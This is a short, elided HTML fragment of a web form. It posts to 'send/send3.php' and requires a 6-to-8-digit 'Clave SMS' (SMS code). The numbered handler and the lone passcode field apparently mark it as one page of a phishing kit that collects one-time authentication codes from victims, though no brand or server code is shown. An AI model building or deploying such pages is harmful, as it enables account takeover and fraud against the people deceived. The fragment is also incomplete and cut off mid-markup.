...
<body>
    ...
    <main>
        ...
        <div class="grid2">
            ...
            <form action="send/send3.php" method="POST" class="formcc">
                ...
                <div class="divinput">
                    <div for="name" class="labelname">Clave SMS <span style="color: red;">*</span></div>
                   <div class="divimgsms">
                    <input type="tel" id="name" name="sms1" class="name" required="" minlength="6" maxlength="8">
